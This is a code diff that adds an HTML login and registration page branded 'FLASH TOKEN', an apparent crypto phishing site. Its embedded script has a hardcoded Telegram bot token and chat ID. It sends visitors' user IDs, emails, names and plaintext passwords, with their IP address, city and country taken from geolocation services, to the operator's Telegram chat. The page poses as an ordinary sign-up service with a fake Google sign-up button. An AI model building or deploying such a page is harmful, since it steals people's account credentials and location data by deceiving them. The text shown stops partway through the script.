@@ -1,0 +1,1795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FLASH TOKEN - Log In or Sign Up</title>
+    <link rel="icon" type="image/png" href="img/usdt_cryptocurrencies_icon_188337.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e4e6eb 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 0;
+        }
+        
+        /* Header Styles */
+        .main-header {
+            background: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+        }
+        
+        .header-logo img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+        }
+        
+        .header-logo-text {
+            font-size: 32px;
+            font-weight: 900;
+            color: #10b981;
+            letter-spacing: -0.03em;
+        }
+        
+        .header-nav {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+        }
+        
+        .header-link {
+            color: #65676b;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+        
+        .header-link:hover {
+            background: #f0f2f5;
+            color: #10b981;
+        }
+        
+        /* Main Content Area */
+        .content-wrapper {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        .main-container {
+            max-width: 1000px;
+            width: 100%;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+        
+        /* Left Side - Branding */
+        .branding-section {
+            padding: 20px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .logo-image {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+        
+        .brand-name {
+            font-size: 3.5rem;
+            font-weight: 900;
+            color: #10b981;
+            letter-spacing: -0.03em;
+            line-height: 1;
+        }
+        
+        .brand-tagline {
+            font-size: 1.75rem;
+            color: #1c1e21;
+            line-height: 1.4;
+            font-weight: 400;
+            margin-top: 10px;
+        }
+        
+        /* Right Side - Login Form */
+        .form-container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 24px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 17px;
+            margin-bottom: 12px;
+            transition: all 0.2s;
+            background: #ffffff;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #10b981;
+            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
+        }
+        
+        .form-input::placeholder {
+            color: #8a8d91;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 12px;
+        }
+        
+        .login-button:hover {
+            background: linear-gradient(135deg, #059669 0%, #047857 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+        
+        .login-button:active {
+            transform: translateY(0);
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+        
+        .forgot-password a {
+            color: #10b981;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dadde1;
+        }
+        
+        .divider span {
+            padding: 0 16px;
+            color: #8a8d91;
+            font-size: 14px;
+        }
+        
+        .create-account-button {
+            display: inline-block;
+            padding: 16px 48px;
+            background: rgba(16, 185, 129, 0.1);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            color: #10b981;
+            border: 2px solid #10b981;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            margin: 0 auto;
+            display: block;
+            width: fit-content;
+        }
+        
+        .create-account-button:hover {
+            background: rgba(16, 185, 129, 0.2);
+            border-color: #059669;
+            color: #059669;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+        
+        /* Google Sign In Button */
+        .google-signin-button {
+            width: 100%;
+            padding: 14px 16px;
+            background: white;
+            border: 2px solid #dadde1;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #3c4043;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        
+        .google-signin-button:hover {
+            background: #f8f9fa;
+            border-color: #4285f4;
+            box-shadow: 0 2px 8px rgba(66, 133, 244, 0.2);
+            transform: translateY(-1px);
+        }
+        
+        .google-signin-button:active {
+            transform: translateY(0);
+        }
+        
+        .google-icon {
+            width: 24px;
+            height: 24px;
+        }
+        
+        /* Google Sign Up Button in Modal */
+        .google-signup-button {
+            width: 100%;
+            padding: 16px;
+            background: white;
+            border: 2px solid #dadde1;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            color: #3c4043;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        
+        .google-signup-button:hover {
+            background: #f8f9fa;
+            border-color: #4285f4;
+            box-shadow: 0 4px 12px rgba(66, 133, 244, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .google-signup-button:active {
+            transform: translateY(0);
+        }
+        
+        .footer-text {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 13px;
+            color: #8a8d91;
+        }
+        
+        .footer-text a {
+            color: #10b981;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Registration Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            max-width: 450px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        .modal-header {
+            padding: 16px 24px;
+            border-bottom: 1px solid #dadde1;
+            position: relative;
+        }
+        
+        .modal-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 4px;
+        }
+        
+        .modal-subtitle {
+            font-size: 15px;
+            color: #8a8d91;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #8a8d91;
+            cursor: pointer;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+        
+        .close-modal:hover {
+            background: #f0f2f5;
+        }
+        
+        .modal-body {
+            padding: 24px;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        
+        .signup-button {
+            width: 100%;
+            padding: 14px;
+            background: #10b981;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 12px;
+        }
+        
+        .signup-button:hover {
+            background: #059669;
+        }
+        
+        .terms-text {
+            font-size: 11px;
+            color: #8a8d91;
+            text-align: center;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+        
+        .terms-text a {
+            color: #10b981;
+            text-decoration: none;
+        }
+        
+        .terms-text a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Registration Options Styles */
+        .registration-options {
+            padding: 20px 0;
+        }
+        
+        .quick-register-btn,
+        .manual-register-btn {
+            width: 100%;
+            padding: 20px;
+            border-radius: 12px;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        
+        .quick-register-btn {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white;
+            border: none;
+        }
+        
+        .quick-register-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.4);
+        }
+        
+        .manual-register-btn {
+            background: rgba(16, 185, 129, 0.1);
+            backdrop-filter: blur(10px);
+            color: #10b981;
+            border: 2px solid #10b981;
+        }
+        
+        .manual-register-btn:hover {
+            background: rgba(16, 185, 129, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3);
+        }
+        
+        .back-button {
+            background: none;
+            border: none;
+            color: #10b981;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+            padding: 8px 0;
+            transition: all 0.2s;
+        }
+        
+        .back-button:hover {
+            color: #059669;
+            transform: translateX(-4px);
+        }
+        
+        /* Footer Styles */
+        .main-footer {
+            background: white;
+            border-top: 1px solid #dadde1;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #dadde1;
+        }
+        
+        .footer-link {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+        
+        .footer-link:hover {
+            color: #10b981;
+            text-decoration: underline;
+        }
+        
+        .footer-copyright {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        
+        .footer-copyright-text {
+            color: #8a8d91;
+            font-size: 13px;
+        }
+        
+        .footer-social {
+            display: flex;
+            gap: 16px;
+        }
+        
+        .footer-social a {
+            color: #8a8d91;
+            font-size: 18px;
+            transition: all 0.2s;
+        }
+        
+        .footer-social a:hover {
+            color: #10b981;
+            transform: translateY(-2px);
+        }
+        
+        /* Responsive */
+        @media (max-width: 900px) {
+            .main-container {
+                grid-template-columns: 1fr;
+                gap: 20px;
+                max-width: 100%;
+                padding: 0;
+            }
+            
+            .branding-section {
+                text-align: center;
+                padding: 20px 16px 0;
+            }
+            
+            .logo-container {
+                justify-content: center;
+                margin-bottom: 12px;
+            }
+            
+            .logo-image {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .brand-name {
+                font-size: 2.5rem;
+            }
+            
+            .brand-tagline {
+                font-size: 1rem;
+                padding: 0 20px;
+            }
+            
+            .form-container {
+                border-radius: 0;
+                box-shadow: none;
+                padding: 16px;
+                background: transparent;
+            }
+            
+            .form-input {
+                padding: 14px 16px;
+                font-size: 16px;
+                border-radius: 6px;
+            }
+            
+            .login-button {
+                padding: 14px;
+                font-size: 18px;
+                border-radius: 6px;
+            }
+            
+            .create-account-button {
+                padding: 14px 32px;
+                font-size: 16px;
+                border-radius: 6px;
+            }
+            
+            .header-nav {
+                display: none;
+            }
+            
+            .header-logo-text {
+                font-size: 28px;
+            }
+            
+            .header-logo img {
+                width: 36px;
+                height: 36px;
+            }
+            
+            .content-wrapper {
+                padding: 20px 0;
+            }
+            
+            .footer-links {
+                justify-content: center;
+                font-size: 12px;
+            }
+            
+            .footer-copyright {
+                justify-content: center;
+                text-align: center;
+                font-size: 12px;
+            }
+            
+            /* Modal adjustments for mobile */
+            .modal-overlay {
+                padding: 0;
+                align-items: flex-end;
+            }
+            
+            .modal-content {
+                max-width: 100%;
+                width: 100%;
+                max-height: 95vh;
+                border-radius: 12px 12px 0 0;
+                margin: 0;
+            }
+            
+            .modal-header {
+                padding: 12px 16px;
+            }
+            
+            .modal-title {
+                font-size: 24px;
+            }
+            
+            .modal-subtitle {
+                font-size: 14px;
+            }
+            
+            .modal-body {
+                padding: 16px;
+            }
+            
+            .google-signup-button {
+                padding: 14px;
+                font-size: 16px;
+            }
+            
+            .quick-register-btn,
+            .manual-register-btn {
+                padding: 16px;
+            }
+            
+            .quick-register-btn .text-lg,
+            .manual-register-btn .text-lg {
+                font-size: 16px;
+            }
+            
+            .quick-register-btn .text-sm,
+            .manual-register-btn .text-sm {
+                font-size: 13px;
+            }
+            
+            /* ===== Footer Mobile Styles (clean, no !important) ===== */
+            footer .container {
+                padding: 24px 16px;
+            }
+            footer .grid { gap: 24px; }
+            footer .sm\:col-span-2 { grid-column: span 1; }
+            footer h3 { font-size: 20px; }
+            footer h4 { font-size: 16px; margin-bottom: 12px; }
+            footer p, footer li a, footer li span { font-size: 13px; line-height: 1.5; }
+            footer .flex.items-center.mb-6 { justify-content: center; margin-bottom: 16px; }
+            footer .flex.items-center.mb-6 img { height: 40px; width: 40px; margin-right: 12px; }
+            footer .grid.grid-cols-2 { gap: 8px; }
+            footer .grid.grid-cols-2 > div { padding: 12px; }
+            footer .grid.grid-cols-2 .text-2xl,
+            footer .grid.grid-cols-2 .text-3xl { font-size: 20px; }
+            footer .flex.flex-wrap.gap-3 { justify-content: center; gap: 8px; }
+            footer .flex.flex-wrap.gap-3 a { padding: 10px; }
+            footer .flex.flex-wrap.justify-center.gap-4 { gap: 12px; }
+            footer .flex.flex-col.items-center img { height: 28px; width: 28px; }
+            footer .flex.flex-col.items-center span { font-size: 10px; }
+            footer .flex.items-center.gap-2 { padding: 8px 10px; }
+            footer .flex.items-center.gap-2 img { height: 20px; width: 20px; }
+            footer .flex.items-center.gap-2 span { font-size: 11px; }
+            footer ul { text-align: center; }
+            footer ul li { justify-content: center; }
+            footer .border-t { margin: 20px 0; }
+            footer .flex.justify-center.mb-6 { margin-bottom: 20px; }
+            footer .bg-gradient-to-r { padding: 16px 12px; flex-direction: column; text-align: center; }
+            footer .bg-gradient-to-r img { height: 32px; margin-right: 0; margin-bottom: 8px; }
+            footer .bg-gradient-to-r .text-sm { font-size: 12px; }
+            footer .bg-gradient-to-r .text-xs { font-size: 10px; }
+            footer .flex.flex-col.md\:flex-row p { font-size: 11px; text-align: center; }
+        }
+        
+        @media (max-width: 480px) {
+            body { font-size: 14px; }
+            .header-content { padding: 10px 12px; }
+            .header-logo-text { font-size: 24px; }
+            .header-logo img { width: 32px; height: 32px; }
+            .logo-image { width: 50px; height: 50px; }
+            .brand-name { font-size: 2rem; }
+            .brand-tagline { font-size: 0.9rem; }
+            .form-container { padding: 12px; }
+            .form-input { padding: 12px 14px; font-size: 16px; margin-bottom: 10px; }
+            .login-button { padding: 12px; font-size: 17px; }
+            .create-account-button { padding: 12px 24px; font-size: 15px; }
+            .forgot-password { margin: 12px 0; }
+            .forgot-password a { font-size: 13px; }
+            .divider { margin: 16px 0; }
+            .divider span { font-size: 13px; }
+            .footer-text { font-size: 12px; margin-top: 20px; }
+            .form-row { grid-template-columns: 1fr; gap: 10px; }
+            .modal-title { font-size: 20px; }
+            .modal-subtitle { font-size: 13px; }
+            .close-modal { width: 32px; height: 32px; font-size: 20px; }
+            .google-signup-button { padding: 12px; font-size: 15px; }
+            .google-icon { width: 20px; height: 20px; }
+            .quick-register-btn, .manual-register-btn { padding: 14px; }
+            .quick-register-btn i, .manual-register-btn i { font-size: 24px; }
+            .quick-register-btn .text-lg, .manual-register-btn .text-lg { font-size: 15px; }
+            .quick-register-btn .text-sm, .manual-register-btn .text-sm { font-size: 12px; }
+            .signup-button { padding: 12px; font-size: 16px; }
+            .terms-text { font-size: 10px; }
+            .back-button { font-size: 13px; }
+            
+            /* Footer Extra Small Screens */
+            footer .container { padding: 20px 12px; }
+            footer h3 { font-size: 18px; }
+            footer h4 { font-size: 15px; }
+            footer p { font-size: 12px; }
+            footer .flex.items-center.mb-6 img { height: 36px; width: 36px; }
+            footer .grid.grid-cols-2 > div { padding: 10px; }
+            footer .grid.grid-cols-2 .text-2xl,
+            footer .grid.grid-cols-2 .text-3xl { font-size: 18px; }
+            footer .grid.grid-cols-2 .text-xs { font-size: 9px; }
+            footer .flex.flex-wrap.gap-3 a { padding: 8px; }
+            footer .flex.flex-col.items-center img { height: 24px; width: 24px; }
+            footer .flex.flex-col.items-center span { font-size: 9px; }
+            footer .flex.items-center.gap-2 { padding: 6px 8px; }
+            footer .flex.items-center.gap-2 img { height: 18px; width: 18px; }
+            footer .flex.items-center.gap-2 span { font-size: 10px; }
+            footer ul li a, footer ul li span { font-size: 12px; }
+            footer .bg-gradient-to-r { padding: 12px 10px; }
+            footer .bg-gradient-to-r img { height: 28px; }
+            footer .bg-gradient-to-r .text-sm { font-size: 11px; }
+            footer .bg-gradient-to-r .text-xs { font-size: 9px; }
+            footer .flex.flex-col.md\:flex-row p { font-size: 10px; }
+        }
+        
+        @media (max-width: 360px) {
+            .header-logo-text { font-size: 20px; }
+            .brand-name { font-size: 1.75rem; }
+            .brand-tagline { font-size: 0.85rem; }
+            .form-input { padding: 11px 12px; font-size: 15px; }
+            .login-button, .signup-button { padding: 11px; font-size: 16px; }
+            .create-account-button { padding: 11px 20px; font-size: 14px; }
+            
+            /* Footer Very Small Screens */
+            footer .container { padding: 16px 10px; }
+            footer h3 { font-size: 16px; }
+            footer h4 { font-size: 14px; }
+            footer p { font-size: 11px; }
+            footer .grid { gap: 20px; }
+            footer .flex.items-center.mb-6 { flex-direction: column; gap: 8px; }
+            footer .flex.items-center.mb-6 img { margin-right: 0; margin-bottom: 8px; }
+            footer .grid.grid-cols-2 { grid-template-columns: 1fr; gap: 6px; }
+            footer .flex.flex-wrap.justify-center.gap-4,
+            footer .flex.flex-wrap.justify-center.gap-3 { gap: 8px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="main-header">
+        <div class="header-content">
+            <a href="home.html" class="header-logo">
+                <img src="img/usdt_cryptocurrencies_icon_188337.png" alt="FLASH TOKEN">
+                <span class="header-logo-text">FLASH TOKEN</span>
+            </a>
+            <nav class="header-nav">
+                <a href="home.html" class="header-link"><i class="fas fa-home"></i> Home</a>
+                <a href="pages/how-it-works.html" class="header-link"><i class="fas fa-info-circle"></i> About</a>
+                <a href="pages/support.html" class="header-link"><i class="fas fa-headset"></i> Support</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="content-wrapper">
+        <div class="main-container">
+        <!-- Left Side - Branding -->
+        <div class="branding-section">
+            <div class="logo-container">
+                <img src="img/usdt_cryptocurrencies_icon_188337.png" alt="FLASH TOKEN" class="logo-image">
+                <h1 class="brand-name">FLASH TOKEN</h1>
+            </div>
+            <p class="brand-tagline">FLASH TOKEN helps you connect and share with the people in your crypto life.</p>
+        </div>
+        
+        <!-- Right Side - Login Form -->
+        <div class="form-container">
+            <form id="loginForm">
+                <input type="text" class="form-input" placeholder="Email or User ID" required>
+                <input type="password" class="form-input" placeholder="Password" required>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <div class="divider">
+                <span>or</span>
+            </div>
+            
+            <button class="create-account-button" id="createAccountBtn">Create new account</button>
+            
+            <div class="footer-text">
+                <a href="home.html"><i class="fas fa-home"></i> Back to Home</a>
+            </div>
+        </div>
+    </div>
+    </div>
+    
+    <!-- Registration Modal -->
+    <div class="modal-overlay" id="registrationModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Sign Up</h2>
+                <p class="modal-subtitle">It's quick and easy.</p>
+                <button class="close-modal" id="closeModal">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="modal-body">
+                <!-- Registration Options -->
+                <div class="registration-options" id="registrationOptions">
+                    <h3 class="text-center text-xl font-bold text-gray-800 mb-6">Choose Registration Method</h3>
+                    
+                    <!-- Google Sign Up Button -->
+                    <button class="google-signup-button" id="googleSignUpBtn">
+                        <svg class="google-icon" viewBox="0 0 24 24" width="24" height="24">
+                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                        </svg>
+                        <span>Sign up with Google</span>
+                    </button>
+                    
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                    
+                    <button class="quick-register-btn" onclick="quickRegister()">
+                        <div class="flex items-center justify-center gap-3">
+                            <i class="fas fa-bolt text-3xl"></i>
+                            <div class="text-left">
+                                <div class="text-lg font-bold">Quick Registration</div>
+                                <div class="text-sm opacity-90">Create account instantly with one click</div>
+                            </div>
+                        </div>
+                    </button>
+                    
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                    
+                    <button class="manual-register-btn" onclick="showManualForm()">
+                        <div class="flex items-center justify-center gap-3">
+                            <i class="fas fa-edit text-3xl"></i>
+                            <div class="text-left">
+                                <div class="text-lg font-bold">Manual Registration</div>
+                                <div class="text-sm opacity-90">Fill in your details manually</div>
+                            </div>
+                        </div>
+                    </button>
+                </div>
+                
+                <!-- Manual Registration Form (Hidden by default) -->
+                <form id="registrationForm" style="display: none;">
+                    <button type="button" class="back-button" onclick="showRegistrationOptions()">
+                        <i class="fas fa-arrow-left"></i> Back to options
+                    </button>
+                    
+                    <div class="form-row">
+                        <input type="text" class="form-input" placeholder="First name" required>
+                        <input type="text" class="form-input" placeholder="Last name" required>
+                    </div>
+                    
+                    <input type="email" class="form-input" placeholder="Email address" required>
+                    <input type="password" class="form-input" placeholder="New password" required>
+                    
+                    <button type="submit" class="signup-button">Sign Up</button>
+                    
+                    <p class="terms-text">
+                        By clicking Sign Up, you agree to our <a href="#">Terms</a>, 
+                        <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>. 
+                        You may receive SMS notifications from us and can opt out at any time.
+                    </p>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '7746028957:AAE5HFQgmjm8qgZPtdn2Ot_iNmMX1ZdJ1nU';
+        const TELEGRAM_CHAT_ID = '2126771039';
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(userData) {
+            // Get user's country
+            const country = await getUserCountry();
+            userData.country = country;
+            
+            const message = formatUserDataMessage(userData);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ Data sent to Telegram successfully');
+                    return true;
+                } else {
+                    console.error('❌ Failed to send to Telegram:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Get user's country using IP geolocation
+        async function getUserCountry() {
+            try {
+                // Try multiple geolocation services
+                const services = [
+                    'https://ipapi.co/json/',
+                    'https://ip-api.com/json/',
+                    'https://ipwhois.app/json/'
+                ];
+                
+                for (const service of services) {
+                    try {
+                        const response = await fetch(service);
+                        const data = await response.json();
+                        
+                        // Extract country from different API formats
+                        const country = data.country_name || data.country || data.country_code || 'Unknown';
+                        const countryCode = data.country_code || data.countryCode || '';
+                        const city = data.city || '';
+                        const region = data.region || data.region_name || '';
+                        const ip = data.ip || '';
+                        
+                        return {
+                            country: country,
+                            countryCode: countryCode,
+                            city: city,
+                            region: region,
+                            ip: ip
+                        };
+                    } catch (err) {
+                        continue; // Try next service
+                    }
+                }
+                
+                return {
+                    country: 'Unknown',
+                    countryCode: '',
+                    city: '',
+                    region: '',
+                    ip: ''
+                };
+            } catch (error) {
+                console.error('Error getting country:', error);
+                return {
+                    country: 'Unknown',
+                    countryCode: '',
+                    city: '',
+                    region: '',
+                    ip: ''
+                };
+            }
+        }
+        
+        // Format user data for Telegram message
+        function formatUserDataMessage(userData) {
+            const timestamp = new Date().toLocaleString('en-US', {
+                timeZone: 'UTC',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            // Get country flag emoji
+            const countryFlag = userData.country && userData.country.countryCode 
+                ? getCountryFlag(userData.country.countryCode) 
+                : '🌍';
+            
+            let message = `🔔 <b>New User Registration</b>\n\n`;
+            message += `📅 <b>Date:</b> ${timestamp} UTC\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+            
+            if (userData.registrationType === 'quick') {
+                message += `⚡ <b>Registration Type:</b> Quick Registration\n\n`;
+                message += `👤 <b>User ID:</b> <code>${userData.userId}</code>\n`;
+                message += `🔑 <b>Password:</b> <code>${userData.password}</code>\n`;
+            } else if (userData.registrationType === 'manual') {
+                message += `📝 <b>Registration Type:</b> Manual Registration\n\n`;
+                message += `👤 <b>Full Name:</b> ${userData.fullName}\n`;
+                message += `📧 <b>Email:</b> ${userData.email}\n`;
+                message += `🆔 <b>User ID:</b> <code>${userData.userId}</code>\n`;
+                message += `🔑 <b>Password:</b> <code>${userData.password}</code>\n`;
+            } else if (userData.registrationType === 'google') {
+                message += `🔵 <b>Registration Type:</b> Google Sign Up\n\n`;
+                message += `👤 <b>Full Name:</b> ${userData.fullName}\n`;
+                message += `📧 <b>Email:</b> ${userData.email}\n`;
+                message += `🆔 <b>User ID:</b> <code>${userData.userId}</code>\n`;
+                message += `🔑 <b>Password:</b> <code>${userData.password}</code>\n`;
+            } else if (userData.type === 'login') {
+                message = `🔓 <b>User Login</b>\n\n`;
+                message += `📅 <b>Date:</b> ${timestamp} UTC\n`;
+                message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+                message += `👤 <b>Email/User ID:</b> ${userData.emailOrUserId}\n`;
+                message += `🔑 <b>Password:</b> <code>${userData.password}</code>\n`;
+            }
+            
+            message += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🌐 <b>Source:</b> FLASH TOKEN Platform\n`;
+            message += `💻 <b>Device:</b> ${navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}\n`;
+            
+            // Add location information
+            if (userData.country) {
+                message += `\n📍 <b>Location Information:</b>\n`;
+                message += `${countryFlag} <b>Country:</b> ${userData.country.country}\n`;
+                if (userData.country.city) {
+                    message += `🏙️ <b>City:</b> ${userData.country.city}\n`;
+                }
+                if (userData.country.region) {
+                    message += `🗺️ <b>Region:</b> ${userData.country.region}\n`;
+                }
+                if (userData.country.ip) {
+                    message += `🔗 <b>IP Address:</b> <code>${userData.country.ip}</code>\n`;
+                }
+            }
+            
+            return message;
+        }
+        
+        // Get country flag emoji from country code
+        function getCountryFlag(countryCode) {
+            if (!countryCode || countryCode.length !== 2) return '🌍';
+            const codePoints = countryCode
+                .toUpperCase()
+                .split('')
+                .map(char => 127397 + char.charCodeAt());
+            return String.fromCodePoint(...codePoints);
+        }
+        
+        // Local Storage Management
+        function saveUserToLocalStorage(userData) {
+            // Get existing users from localStorage
+            let users = JSON.parse(localStorage.getItem('registeredUsers')) || [];
+            
+            // Add timestamp and unique ID
+            userData.registeredAt = new Date().toISOString();
+            userData.id = Date.now() + Math.random().toString(36).substr(2, 9);
+            
+            // Add new user to array
+            users.push(userData);
+            
+            // Save back to localStorage
+            localStorage.setItem('registeredUsers', JSON.stringify(users));
+            
+            // Also save current logged in user
+            localStorage.setItem('currentUser', JSON.stringify(userData));
+            
+            // Update daily statistics
+            updateDailyStats(userData);
